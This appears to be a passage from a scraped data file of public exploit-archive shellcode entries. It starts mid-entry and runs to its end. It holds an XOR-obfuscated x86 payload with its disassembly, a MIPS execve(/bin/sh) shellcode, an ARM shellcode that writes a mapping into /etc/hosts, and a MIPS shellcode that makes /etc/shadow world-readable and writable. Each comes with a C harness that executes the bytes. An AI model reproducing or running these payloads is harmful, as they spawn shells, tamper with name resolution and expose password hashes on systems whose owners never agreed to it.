6a 2d       \tmov    $0x2d6a7a69,%edx", " 259:\t31 d1                \txor    %edx,%ecx", " 25b:\t51                   \tpush   %ecx", " 25c:\tb9 67 67 1d 37       \tmov    $0x371d6767,%ecx", " 261:\tba 45 47 32 41       \tmov    $0x41324745,%edx", " 266:\t31 d1                \txor    %edx,%ecx", " 268:\t51                   \tpush   %ecx", " 269:\tb9 03 33 0d 3b       \tmov    $0x3b0d3303,%ecx", " 26e:\tba 71 45 68 49       \tmov    $0x49684571,%edx", " 273:\t31 d1                \txor    %edx,%ecx", " 275:\t51                   \tpush   %ecx", " 276:\tb9 39 6a 3c 2f       \tmov    $0x2f3c6a39,%ecx", " 27b:\tba 55 4a 6f 4a       \tmov    $0x4a6f4a55,%edx", " 280:\t31 d1                \txor    %edx,%ecx", " 282:\t51                   \tpush   %ecx", " 283:\tb9 37 44 1f 2e       \tmov    $0x2e1f4437,%ecx", " 288:\tba 5a 2d 71 4f       \tmov    $0x4f712d5a,%edx", " 28d:\t31 d1                \txor    %edx,%ecx", " 28f:\t51                   \tpush   %ecx", " 290:\tb9 34 23 23 3b       \tmov    $0x3b232334,%ecx", " 295:\tba 68 77 46 49       \tmov    $0x49467768,%edx", " 29a:\t31 d1                \txor    %edx,%ecx", " 29c:\t51                   \tpush   %ecx", " 29d:\tb9 07 3a 0a 14       \tmov    $0x140a3a07,%ecx", " 2a2:\tba 73 48 65 78       \tmov    $0x78654873,%edx", " 2a7:\t31 d1                \txor    %edx,%ecx", " 2a9:\t51                   \tpush   %ecx", " 2aa:\tb9 14 2e 58 53       \tmov    $0x53582e14,%ecx", " 2af:\tba 48 6d 37 3d       \tmov    $0x3d376d48,%edx", " 2b4:\t31 d1                \txor    %edx,%ecx", " 2b6:\t51                   \tpush   %ecx", " 2b7:\tb9 3e 3d 26 32       \tmov    $0x32263d3e,%ecx", " 2bc:\tba 52 6e 43 46       \tmov    $0x46436e52,%edx", " 2c1:\t31 d1                \txor    %edx,%ecx", " 2c3:\t51                   \tpush   %ecx", " 2c4:\tb9 33 3c 35 34       \tmov    $0x34353c33,%ecx", " 2c9:\tba 5d 48 47 5b       \tmov    $0x5b47485d,%edx", " 2ce:\t31 d1                \txor    %edx,%ecx", " 2d0:\t51                   \tpush   %ecx", " 2d1:\tb9 36 0e 07 2b       \tmov    $0x2b070e36,%ecx", " 2d6:\tba 58 7a 44 44       \tmov    $0x44447a58,%edx", " 2db:\t31 d1                \txor    %edx,%ecx", " 2dd:\t51                   \tpush   %ecx", " 2de:\tb9 3c 10 0a 37       \tmov    $0x370a103c,%ecx", " 2e3:\tba 49 62 78 52       \tmov    $0x52786249,%edx", " 2e8:\t31 d1                \txor    %edx,%ecx", " 2ea:\t51                   \tpush   %ecx", " 2eb:\tb9 24 7c 3b 36       \tmov    $0x363b7c24,%ecx", " 2f0:\tba 61 31 67 75       \tmov    $0x75673161,%edx", " 2f5:\t31 d1                \txor    %edx,%ecx", " 2f7:\t51                   \tpush   %ecx", " 2f8:\tb9 31 3d 3b 27       \tmov    $0x273b3d31,%ecx", " 2fd:\tba 62 64 68 73       \tmov    $0x73686462,%edx", " 302:\t31 d1                \txor    %edx,%ecx", " 304:\t51                   \tpush   %ecx", " 305:\tb9 7f 7d 3d 35       \tmov    $0x353d7d7f,%ecx", " 30a:\tba 36 33 78 69       \tmov    $0x69783336,%edx", " 30f:\t31 d1                \txor    %edx,%ecx", " 311:\t51                   \tpush   %ecx", " 312:\tb9 7c 13 0f 2f       \tmov    $0x2f0f137c,%ecx", " 317:\tba 31 52 4c 67       \tmov    $0x674c5231,%edx", " 31c:\t31 d1                \txor    %edx,%ecx", " 31e:\t51                   \tpush   %ecx", " 31f:\tb9 1b 08 35 2d       \tmov    $0x2d35081b,%ecx", " 324:\tba 58 49 79 72       \tmov    $0x72794958,%edx", " 329:\t31 d1                \txor    %edx,%ecx", " 32b:\t51                   \tpush   %ecx", " 32c:\tb9 74 3a 1e 21       \tmov    $0x211e3a74,%ecx", " 331:\tba 2d 65 52 6e       \tmov    $0x6e52652d,%edx", " 336:\t31 d1                \txor    %edx,%ecx", " 338:\t51                   \tpush   %ecx", " 339:\tb9 16 10 1f 17       \tmov    $0x171f1016,%ecx", " 33e:\tba 34 58 54 52       \tmov    $0x52545834,%edx", " 343:\t31 d1                \txor    %edx,%ecx", " 345:\t51                   \tpush   %ecx", " 346:\tb9 2f 27 0c 6e       \tmov    $0x6e0c272f,%ecx", " 34b:\tba 4e 43 68 4e       \tmov    $0x4e68434e,%edx", " 350:\t31 d1                \txor    %edx,%ecx", " 352:\t51                   \tpush   %ecx", " 353:\tb9 39 22 5e 50       \tmov    $0x505e2239,%ecx", " 358:\tba 4b 47 39 70       \tmov    $0x7039474b,%edx", " 35d:\t31 d1                \txor    %edx,%ecx", " 35f:\t51                   \tpush   %ecx", " 360:\t89 e0                \tmov    %esp,%eax", " 362:\tbb 41 41 41 01       \tmov    $0x1414141,%ebx", " 367:\tc1 eb 08             \tshr    $0x8,%ebx", " 36a:\tc1 eb 08             \tshr    $0x8,%ebx", " 36d:\tc1 eb 08             \tshr    $0x8,%ebx", " 370:\t53                   \tpush   %ebx", " 371:\t50                   \tpush   %eax", " 372:\tbb dc 7a a8 23       \tmov    $0x23a87adc,%ebx", " 377:\tba 4d 56 36 55       \tmov    $0x5536564d,%edx", " 37c:\t31 d3                \txor    %edx,%ebx", " 37e:\tff d3                \tcall   *%ebx", " 380:\t31 c0                \txor    %eax,%eax", " 382:\t50                   \tpush   %eax", " 383:\tb8 41 41 41 65       \tmov    $0x65414141,%eax", " 388:\tc1 e8 08             \tshr    $0x8,%eax", " 38b:\tc1 e8 08             \tshr    $0x8,%eax", " 38e:\tc1 e8 08             \tshr    $0x8,%eax", " 391:\t50                   \tpush   %eax", " 392:\tb9 1e 53 39 3c       \tmov    $0x3c39531e,%ecx", " 397:\tba 6d 32 5b 50       \tmov    $0x505b326d,%edx", " 39c:\t31 d1                \txor    %edx,%ecx", " 39e:\t51                   \tpush   %ecx", " 39f:\tb9 04 66 2f 32       \tmov    $0x322f6604,%ecx", " 3a4:\tba 61 46 4b 5b       \tmov    $0x5b4b4661,%edx", " 3a9:\t31 d1                \txor    %edx,%ecx", " 3ab:\t51                   \tpush   %ecx", " 3ac:\tb9 19 1e 0d 11       \tmov    $0x110d1e19,%ecx", " 3b1:\tba 69 73 62 75       \tmov    $0x75627369,%edx", " 3b6:\t31 d1                \txor    %edx,%ecx", " 3b8:\t51                   \tpush   %ecx", " 3b9:\tb9 20 41 47 36       \tmov    $0x36474120,%ecx", " 3be:\tba 45 35 67 59       \tmov    $0x59673545,%edx", " 3c3:\t31 d1                \txor    %edx,%ecx", " 3c5:\t51                   \tpush   %ecx", " 3c6:\tb9 2b 05 64 2a       \tmov    $0x2a64052b,%ecx", " 3cb:\tba 47 69 44 59       \tmov    $0x59446947,%edx", " 3d0:\t31 d1                \txor    %edx,%ecx", " 3d2:\t51                   \tpush   %ecx", " 3d3:\tb9 10 3f 4f 22       \tmov    $0x224f3f10,%ecx", " 3d8:\tba 62 5a 38 43       \tmov    $0x43385a62,%edx", " 3dd:\t31 d1                \txor    %edx,%ecx", " 3df:\t51                   \tpush   %ecx", " 3e0:\tb9 2a 6f 2a 24       \tmov    $0x242a6f2a,%ecx", " 3e5:\tba 42 4f 4c 4d       \tmov    $0x4d4c4f42,%edx", " 3ea:\t31 d1                \txor    %edx,%ecx", " 3ec:\t51                   \tpush   %ecx", " 3ed:\tb9 29 09 1e 5e       \tmov    $0x5e1e0929,%ecx", " 3f2:\tba 47 6c 6a 2d       \tmov    $0x2d6a6c47,%edx", " 3f7:\t31 d1                \txor    %edx,%ecx", " 3f9:\t51                   \tpush   %ecx", " 3fa:\t89 e0                \tmov    %esp,%eax", " 3fc:\tbb 41 41 41 01       \tmov    $0x1414141,%ebx", " 401:\tc1 eb 08             \tshr    $0x8,%ebx", " 404:\tc1 eb 08             \tshr    $0x8,%ebx", " 407:\tc1 eb 08             \tshr    $0x8,%ebx", " 40a:\t53                   \tpush   %ebx", " 40b:\t50                   \tpush   %eax", " 40c:\tbb dc 7a a8 23       \tmov    $0x23a87adc,%ebx", " 411:\tba 4d 56 36 55       \tmov    $0x5536564d,%edx", " 416:\t31 d3                \txor    %edx,%ebx", " 418:\tff d3                \tcall   *%ebx", " 41a:\t31 c0                \txor    %eax,%eax", " 41c:\t50                   \tpush   %eax", " 41d:\tb8 41 41 41 6f       \tmov    $0x6f414141,%eax", " 422:\tc1 e8 08             \tshr    $0x8,%eax", " 425:\tc1 e8 08             \tshr    $0x8,%eax", " 428:\tc1 e8 08             \tshr    $0x8,%eax", " 42b:\t50                   \tpush   %eax", " 42c:\tb9 72 2a 05 39       \tmov    $0x39052a72,%ecx", " 431:\tba 52 4b 70 4d       \tmov    $0x4d704b52,%edx", " 436:\t31 d1                \txor    %edx,%ecx", " 438:\t51                   \tpush   %ecx", " 439:\tb9 54 3a 05 52       \tmov    $0x52053a54,%ecx", " 43e:\tba 35 48 71 6f       \tmov    $0x6f714835,%edx", " 443:\t31 d1                \txor    %edx,%ecx", " 445:\t51                   \tpush   %ecx", " 446:\tb9 29 16 0a 47       \tmov    $0x470a1629,%ecx", " 44b:\tba 4c 36 79 33       \tmov    $0x3379364c,%edx", " 450:\t31 d1                \txor    %edx,%ecx", " 452:\t51                   \tpush   %ecx", " 453:\tb9 27 1b 5b 3e       \tmov    $0x3e5b1b27,%ecx", " 458:\tba 55 6d 32 5d       \tmov    $0x5d326d55,%edx", " 45d:\t31 d1                \txor    %edx,%ecx", " 45f:\t51                   \tpush   %ecx", " 460:\tb9 33 1a 3b 10       \tmov    $0x103b1a33,%ecx", " 465:\tba 41 77 48 75       \tmov    $0x75487741,%edx", " 46a:\t31 d1                \txor    %edx,%ecx", " 46c:\t51                   \tpush   %ecx", " 46d:\tb9 34 79 3a 12       \tmov    $0x123a7934,%ecx", " 472:\tba 53 59 4e 77       \tmov    $0x774e5953,%edx", " 477:\t31 d1                \txor    %edx,%ecx", " 479:\t51                   \tpush   %ecx", " 47a:\tb9 1d 5c 1e 28       \tmov    $0x281e5c1d,%ecx", " 47f:\tba 72 32 78 41       \tmov    $0x41783272,%edx", " 484:\t31 d1                \txor    %edx,%ecx", " 486:\t51                   \tpush   %ecx", " 487:\tb9 2a 4e 5a 28       \tmov    $0x285a4e2a,%ecx", " 48c:\tba 59 2d 7a 4b       \tmov    $0x4b7a2d59,%edx", " 491:\t31 d1                \txor    %edx,%ecx", " 493:\t51                   \tpush   %ecx", " 494:\t89 e0                \tmov    %esp,%eax", " 496:\tbb 41 41 41 01       \tmov    $0x1414141,%ebx", " 49b:\tc1 eb 08             \tshr    $0x8,%ebx", " 49e:\tc1 eb 08             \tshr    $0x8,%ebx", " 4a1:\tc1 eb 08             \tshr    $0x8,%ebx", " 4a4:\t53                   \tpush   %ebx", " 4a5:\t50                   \tpush   %eax", " 4a6:\tbb dc 7a a8 23       \tmov    $0x23a87adc,%ebx", " 4ab:\tba 4d 56 36 55       \tmov    $0x5536564d,%edx", " 4b0:\t31 d3                \txor    %edx,%ebx", " 4b2:\tff d3                \tcall   *%ebx", " 4b4:\tbb 9b 4f d0 30       \tmov    $0x30d04f9b,%ebx", " 4b9:\tba 63 36 46 46       \tmov    $0x46463663,%edx", " 4be:\t31 d3                \txor    %edx,%ebx", " 4c0:\tff d3                \tcall   *%ebx", "*/", " ", "#include <stdio.h>", "#include <string.h>", " ", "int main(){", "unsigned char shellcode[]= \"\\x31\\xc0\\x50\\xb8\\x41\\x41\\x41\\x64\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\x50\\xb9\\x6d\\x76\\x53\\x52\\xba\\x4d\\x59\\x32\\x36\\x31\\xd1\\x51\\xb9\\x6e\\x72\\x61\\x71\\xba\\x4e\\x33\\x2d\\x38\\x31\\xd1\\x51\\xb9\\x6c\\x75\\x78\\x78\\xba\\x4c\\x34\\x34\\x31\\x31\\xd1\\x51\\xb9\\x46\\x47\\x57\\x46\\xba\\x33\\x34\\x32\\x34\\x31\\xd1\\x51\\xb9\\x56\\x50\\x47\\x64\\xba\\x38\\x35\\x33\\x44\\x31\\xd1\\x51\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\xdc\\x7a\\xa8\\x23\\xba\\x4d\\x56\\x36\\x55\\x31\\xd3\\xff\\xd3\\x31\\xc0\\x50\\x68\\x41\\x41\\x64\\x64\\x58\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\x50\\xb9\\x01\\x41\\x60\\x32\\xba\\x48\\x61\\x4f\\x53\\x31\\xd1\\x51\\xb9\\x28\\x47\\x0d\\x2f\\xba\\x5b\\x67\\x4c\\x63\\x31\\xd1\\x51\\xb9\\x03\\x24\\x36\\x21\\xba\\x62\\x50\\x59\\x53\\x31\\xd1\\x51\\xb9\\x34\\x41\\x15\\x18\\xba\\x5d\\x32\\x61\\x6a\\x31\\xd1\\x51\\xb9\\x0c\\x05\\x1b\\x25\\xba\\x68\\x68\\x72\\x4b\\x31\\xd1\\x51\\xb9\\x2f\\x27\\x7b\\x13\\xba\\x5a\\x57\\x5b\\x52\\x31\\xd1\\x51\\xb9\\x1c\\x2c\\x02\\x3e\\xba\\x70\\x4b\\x70\\x51\\x31\\xd1\\x51\\xb9\\x3d\\x2a\\x32\\x4c\\xba\\x51\\x45\\x51\\x2d\\x31\\xd1\\x51\\xb9\\x23\\x5c\\x1c\\x19\\xba\\x4d\\x39\\x68\\x39\\x31\\xd1\\x51\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\xdc\\x7a\\xa8\\x23\\xba\\x4d\\x56\\x36\\x55\\x31\\xd3\\xff\\xd3\\x31\\xc0\\x50\\x68\\x41\\x41\\x64\\x64\\x58\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\x50\\xb9\\x02\\x63\\x6b\\x35\\xba\\x4b\\x43\\x44\\x54\\x31\\xd1\\x51\\xb9\\x61\\x55\\x6c\\x3d\\xba\\x43\\x75\\x2d\\x71\\x31\\xd1\\x51\\xb9\\x27\\x3f\\x3b\\x1a\\xba\\x54\\x5a\\x49\\x69\\x31\\xd1\\x51\\xb9\\x25\\x34\\x12\\x67\\xba\\x4a\\x44\\x32\\x32\\x31\\xd1\\x51\\xb9\\x0b\\x02\\x1f\\x19\\xba\\x6e\\x71\\x74\\x6d\\x31\\xd1\\x51\\xb9\\x39\\x3f\\x7b\\x15\\xba\\x4d\\x5a\\x5b\\x51\\x31\\xd1\\x51\\xb9\\x35\\x15\\x03\\x2a\\xba\\x67\\x70\\x6e\\x45\\x31\\xd1\\x51\\xb9\\x3a\\x17\\x75\\x46\\xba\\x6f\\x47\\x55\\x64\\x31\\xd1\\x51\\xb9\\x26\\x35\\x0b\\x1e\\xba\\x6a\\x72\\x59\\x51\\x31\\xd1\\x51\\xb9\\x2a\\x2a\\x06\\x2a\\xba\\x66\\x65\\x45\\x6b\\x31\\xd1\\x51\\xb9\\x1d\\x20\\x35\\x5a\\xba\\x53\\x65\\x61\\x7a\\x31\\xd1\\x51\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\xdc\\x7a\\xa8\\x23\\xba\\x4d\\x56\\x36\\x55\\x31\\xd3\\xff\\xd3\\x31\\xc0\\x50\\xb9\\x09\\x4c\\x7c\\x5e\\xba\\x38\\x6c\\x53\\x38\\x31\\xd1\\x51\\xb9\\x42\\x4d\\x39\\x14\\xba\\x62\\x62\\x5d\\x34\\x31\\xd1\\x51\\xb9\\x7a\\x24\\x26\\x75\\xba\\x2d\\x6b\\x74\\x31\\x31\\xd1\\x51\\xb9\\x1d\\x30\\x15\\x28\\xba\\x58\\x77\\x4a\\x6c\\x31\\xd1\\x51\\xb9\\x7c\\x2f\\x57\\x16\\xba\\x53\\x5b\\x77\\x44\\x31\\xd1\\x51\\xb9\\x42\\x25\\x2a\\x66\\xba\\x2d\\x4b\\x59\\x46\\x31\\xd1\\x51\\xb9\\x28\\x2f\\x0c\\x5a\\xba\\x4d\\x4c\\x78\\x33\\x31\\xd1\\x51\\xb9\\x20\\x2b\\x26\\x26\\xba\\x63\\x44\\x48\\x48\\x31\\xd1\\x51\\xb9\\x08\\x2b\\x23\\x67\\xba\\x66\\x52\\x77\\x34\\x31\\xd1\\x51\\xb9\\x49\\x1c\\x2e\\x48\\xba\\x69\\x7a\\x6a\\x2d\\x31\\xd1\\x51\\xb9\\x67\\x67\\x1d\\x37\\xba\\x45\\x47\\x32\\x41\\x31\\xd1\\x51\\xb9\\x03\\x33\\x0d\\x3b\\xba\\x71\\x45\\x68\\x49\\x31\\xd1\\x51\\xb9\\x39\\x6a\\x3c\\x2f\\xba\\x55\\x4a\\x6f\\x4a\\x31\\xd1\\x51\\xb9\\x37\\x44\\x1f\\x2e\\xba\\x5a\\x2d\\x71\\x4f\\x31\\xd1\\x51\\xb9\\x34\\x23\\x23\\x3b\\xba\\x68\\x77\\x46\\x49\\x31\\xd1\\x51\\xb9\\x07\\x3a\\x0a\\x14\\xba\\x73\\x48\\x65\\x78\\x31\\xd1\\x51\\xb9\\x14\\x2e\\x58\\x53\\xba\\x48\\x6d\\x37\\x3d\\x31\\xd1\\x51\\xb9\\x3e\\x3d\\x26\\x32\\xba\\x52\\x6e\\x43\\x46\\x31\\xd1\\x51\\xb9\\x33\\x3c\\x35\\x34\\xba\\x5d\\x48\\x47\\x5b\\x31\\xd1\\x51\\xb9\\x36\\x0e\\x07\\x2b\\xba\\x58\\x7a\\x44\\x44\\x31\\xd1\\x51\\xb9\\x3c\\x10\\x0a\\x37\\xba\\x49\\x62\\x78\\x52\\x31\\xd1\\x51\\xb9\\x24\\x7c\\x3b\\x36\\xba\\x61\\x31\\x67\\x75\\x31\\xd1\\x51\\xb9\\x31\\x3d\\x3b\\x27\\xba\\x62\\x64\\x68\\x73\\x31\\xd1\\x51\\xb9\\x7f\\x7d\\x3d\\x35\\xba\\x36\\x33\\x78\\x69\\x31\\xd1\\x51\\xb9\\x7c\\x13\\x0f\\x2f\\xba\\x31\\x52\\x4c\\x67\\x31\\xd1\\x51\\xb9\\x1b\\x08\\x35\\x2d\\xba\\x58\\x49\\x79\\x72\\x31\\xd1\\x51\\xb9\\x74\\x3a\\x1e\\x21\\xba\\x2d\\x65\\x52\\x6e\\x31\\xd1\\x51\\xb9\\x16\\x10\\x1f\\x17\\xba\\x34\\x58\\x54\\x52\\x31\\xd1\\x51\\xb9\\x2f\\x27\\x0c\\x6e\\xba\\x4e\\x43\\x68\\x4e\\x31\\xd1\\x51\\xb9\\x39\\x22\\x5e\\x50\\xba\\x4b\\x47\\x39\\x70\\x31\\xd1\\x51\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\xdc\\x7a\\xa8\\x23\\xba\\x4d\\x56\\x36\\x55\\x31\\xd3\\xff\\xd3\\x31\\xc0\\x50\\xb8\\x41\\x41\\x41\\x65\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\x50\\xb9\\x1e\\x53\\x39\\x3c\\xba\\x6d\\x32\\x5b\\x50\\x31\\xd1\\x51\\xb9\\x04\\x66\\x2f\\x32\\xba\\x61\\x46\\x4b\\x5b\\x31\\xd1\\x51\\xb9\\x19\\x1e\\x0d\\x11\\xba\\x69\\x73\\x62\\x75\\x31\\xd1\\x51\\xb9\\x20\\x41\\x47\\x36\\xba\\x45\\x35\\x67\\x59\\x31\\xd1\\x51\\xb9\\x2b\\x05\\x64\\x2a\\xba\\x47\\x69\\x44\\x59\\x31\\xd1\\x51\\xb9\\x10\\x3f\\x4f\\x22\\xba\\x62\\x5a\\x38\\x43\\x31\\xd1\\x51\\xb9\\x2a\\x6f\\x2a\\x24\\xba\\x42\\x4f\\x4c\\x4d\\x31\\xd1\\x51\\xb9\\x29\\x09\\x1e\\x5e\\xba\\x47\\x6c\\x6a\\x2d\\x31\\xd1\\x51\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\xdc\\x7a\\xa8\\x23\\xba\\x4d\\x56\\x36\\x55\\x31\\xd3\\xff\\xd3\\x31\\xc0\\x50\\xb8\\x41\\x41\\x41\\x6f\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\x50\\xb9\\x72\\x2a\\x05\\x39\\xba\\x52\\x4b\\x70\\x4d\\x31\\xd1\\x51\\xb9\\x54\\x3a\\x05\\x52\\xba\\x35\\x48\\x71\\x6f\\x31\\xd1\\x51\\xb9\\x29\\x16\\x0a\\x47\\xba\\x4c\\x36\\x79\\x33\\x31\\xd1\\x51\\xb9\\x27\\x1b\\x5b\\x3e\\xba\\x55\\x6d\\x32\\x5d\\x31\\xd1\\x51\\xb9\\x33\\x1a\\x3b\\x10\\xba\\x41\\x77\\x48\\x75\\x31\\xd1\\x51\\xb9\\x34\\x79\\x3a\\x12\\xba\\x53\\x59\\x4e\\x77\\x31\\xd1\\x51\\xb9\\x1d\\x5c\\x1e\\x28\\xba\\x72\\x32\\x78\\x41\\x31\\xd1\\x51\\xb9\\x2a\\x4e\\x5a\\x28\\xba\\x59\\x2d\\x7a\\x4b\\x31\\xd1\\x51\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\xdc\\x7a\\xa8\\x23\\xba\\x4d\\x56\\x36\\x55\\x31\\xd3\\xff\\xd3\\xbb\\x9b\\x4f\\xd0\\x30\\xba\\x63\\x36\\x46\\x46\\x31\\xd3\\xff\\xd3\";", "fprintf(stdout,\"Length: %d\\n\\n\",strlen(shellcode));", "    (*(void(*)()) shellcode)();", "}"]},
{"Title": "Linux/MIPS - execve(/bin/sh) Shellcode (36 bytes)", "Author": "Sanguine", "Published": ": 2015-01-22", "Platform": "Linux_MIPS", "Download": "https://old.exploit-db.com/download/35868.c", "View": "https://old.exploit-db.com/raw/35868/", "code": ["# Exploit Title: 36byte Linux MIPS execve", "# Date: 2015 - 1 - 20", "# Exploit Author: Sanguine", "# Vendor Homepage: http://sangu1ne.tistory.com/", "", "", "#include <stdio.h>", "/*", "Sanguine@debian-mipsel:~/leaveret# cat > MIPS_36b_sc.s", ".section .text", ".globl __start", ".set noreorder", "__start:", "slti $a2, $zero, -1   #set a1 to zero", "p:", "bltzal $a2, p            #not branch always and save ra", "slti $a1, $zero, -1   #set a1 to zero", "addu $a0, $ra, 4097       #a0 + 16", "addu $a0, $a0, -4081", "li $v0, 4011", "syscall  0x40404", ".string \"/bin/sh\"", "Sanguine@debian-mipsel:~/leaveret# as MIPS_36b_sc.s -o MIPS_36b_sc.o", "Sanguine@debian-mipsel:~/leaveret# ld MIPS_36b_sc.o -o MIPS_36b_sc", "Sanguine@debian-mipsel:~/leaveret# ./MIPS_36b_sc", "$ exit", "", "*/", "char sc[] = {", "    \"\\xff\\xff\\x06\\x28\" /* slti $a2, $zero, -1 */", "    \"\\xff\\xff\\xd0\\x04\" /* bltzal $a2, <p> */", "    \"\\xff\\xff\\x05\\x28\" /* slti $a1, $zero, -1  */", "    \"\\x01\\x10\\xe4\\x27\" /* addu $a0, $ra, 4097 */", "    \"\\x0f\\xf0\\x84\\x24\" /* addu $a0, $a0, -4081 */", "    \"\\xab\\x0f\\x02\\x24\" /* li $v0, 4011  */", "    \"\\x0c\\x01\\x01\\x01\" /* syscall  0x40404 */", "    \"/bin/sh\"", "};", "", "void", "main(void)", "{", "    void (*s)(void);", "    printf(\"sc size %d\\n\", sizeof(sc));", "    s = sc;", "    s();", "}"]},
{"Title": "Linux/ARM - Add Map (127.1.1.1 google.lk) In /etc/hosts Shellcode (79 bytes)", "Author": "Osanda Malith Jayathissa", "Published": ": 2015-03-02", "Platform": "ARM", "Download": "http://shell-storm.org/shellcode/files/shellcode-901.php", "View": null, "code": ["/*", "# Title: Add map in /etc/hosts file - 79 bytes", "# Date: 2015-03-02", "# Architecture: armv6l GNU/Linux", "# Website: http://osandamalith.wordpress.com", "# E-Mail: osanda[cat]unseen.is", "# Author: Osanda Malith Jayathissa (@OsandaMalith)", "", "hosts:     file format elf32-littlearm", "", "", "Disassembly of section .text:", "", "00008054 <_start>:", "    8054:       e28f6001        add     r6, pc, #1", "    8058:       e12fff16        bx      r6", "    805c:       1b24            subs    r4, r4, r4", "    805e:       1c22            adds    r2, r4, #0", "    8060:       21ff            movs    r1, #255        ; 0xff", "    8062:       31ff            adds    r1, #255        ; 0xff", "    8064:       31ff            adds    r1, #255        ; 0xff", "    8066:       31ff            adds    r1, #255        ; 0xff", "    8068:       3105            adds    r1, #5", "    806a:       4678            mov     r0, pc", "    806c:       302a            adds    r0, #42 ; 0x2a", "    806e:       2705            movs    r7, #5", "    8070:       df01            svc     1", "    8072:       2214            movs    r2, #20", "    8074:       4679            mov     r1, pc", "    8076:       310c            adds    r1, #12", "    8078:       2704            movs    r7, #4", "    807a:       df01            svc     1", "    807c:       1b24            subs    r4, r4, r4", "    807e:       1c20            adds    r0, r4, #0", "    8080:       2701            movs    r7, #1", "    8082:       df01            svc     1", "    8084:       2e373231        mrccs   2, 1, r3, cr7, cr1, {1}", "    8088:       2e312e31        mrccs   14, 1, r2, cr1, cr1, {1}", "    808c:       6f672031        svcvs   0x00672031", "    8090:       656c676f        strbvs  r6, [ip, #-1903]!       ; 0x76f", "    8094:       0a6b6c2e        beq     1ae3154 <__bss_end__+0x1ad30b0>", "    8098:       6374652f        cmnvs   r4, #197132288  ; 0xbc00000", "    809c:       6f682f2f        svcvs   0x00682f2f", "    80a0:       00737473        rsbseq  r7, r3, r3, ror r4", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "char *shellcode =   \"\\x01\\x60\\x8f\\xe2\"", "                    \"\\x16\\xff\\x2f\\xe1\"", "                    \"\\x24\\x1b\"", "                    \"\\x22\\x1c\"", "                    \"\\xff\\x21\"", "                    \"\\xff\\x31\"", "                    \"\\xff\\x31\"", "                    \"\\xff\\x31\"", "                    \"\\x05\\x31\"", "                    \"\\x78\\x46\"", "                    \"\\x2a\\x30\"", "                    \"\\x05\\x27\"", "                    \"\\x01\\xdf\"", "                    \"\\x14\\x22\" // movs    r2, $0x14 ; length", "                    \"\\x79\\x46\"", "                    \"\\x0c\\x31\"", "                    \"\\x04\\x27\"", "                    \"\\x01\\xdf\"", "                    \"\\x24\\x1b\"", "                    \"\\x20\\x1c\"", "                    \"\\x01\\x27\"", "                    \"\\x01\\xdf\"", "                    \"\\x31\\x32\\x37\\x2e\" // 127.", "                    \"\\x31\\x2e\\x31\\x2e\" // 1.1.", "                    \"\\x31\\x20\\x67\\x6f\" // 1 go", "                    \"\\x6f\\x67\\x6c\\x65\" // ogle", "                    \"\\x2e\\x6c\\x6b\\x0a\" // .lk", "                    \"\\x2f\\x65\\x74\\x63\"", "                    \"\\x2f\\x2f\\x68\\x6f\"", "                    \"\\x73\\x74\\x73\";", "", "int main(void) {", "        fprintf(stdout,\"Length: %d\\n\",strlen(shellcode));", "        (*(void(*)()) shellcode)();", "return 0;", "}"]},
{"Title": "Linux/MIPS (Little Endian) - chmod 666 /etc/shadow Shellcode (55 bytes)", "Author": "Sang Min Lee", "Published": ": 2015-03-05", "Platform": "Linux_MIPS", "Download": "https://old.exploit-db.com/download/36274.c", "View": "https://old.exploit-db.com/raw/36274/", "code": ["#include <stdio.h>", "", "/*", "\tTitle: Linux/MIPS (Little Endian) - chmod 666 /etc/shadow - 55 bytes", "\tDate: 2015-03-05", "\tAuthor: Sang-Min LEE", "\tEmail: leesangmin144@gmail.com", "\tBlog: http://smleenull.tistory.com", "*/", "", "char sc[] = {", "\t\"\\xff\\xff\\x06\\x28\" // slti $a2, $zero, -1", "\t\"\\xff\\xff\\xd0\\x04\" // bltzal $a2, p <p>", "\t\"\\xff\\xff\\x05\\x28\" // slti $a1, $zero, -1", "\t\"\\xb6\\x01\\x05\\x24\" // li $a1, 438", "\t\"\\x01\\x10\\xe4\\x27\" // addu $a0, $ra, 4097", "\t\"\\x1f\\xf0\\x84\\x24\" // addu $a0, $a0, -4065", "\t\"\\xaf\\x0f\\x02\\x24\" // li $v0, 4015", "\t\"\\x0c\\x01\\x01\\x01\" // syscall 0x40404", "\t\"\\xff\\xff\\x04\\x28\" // slti $a0, $zero, -1", "\t\"\\xa1\\x0f\\x02\\x24\" // li $v0, 4001", "\t\"\\x0c\\x01\\x01\\x01\" // syscall 0x40404", "\t\"/etc/shadow\"", "};", "", "/*", "Shellcode", "\\xff\\xff\\x06\\x28\\xff\\xff\\xd0\\x04\\xff\\xff\\x05\\x28\\xb6\\x01\\x05\\x24\\x01\\x10\\xe4\\x27\\x1f\\xf0\\x84\\x24\\xaf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\xff\\xff\\x04\\x28\\xa1\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77", "*/", "", "void main ()", "{", "\tvoid (*s)(void);", "\tprintf(\"sc size %d\\n\", sizeof(sc));", "\ts = sc;", "\ts();", "}"]},
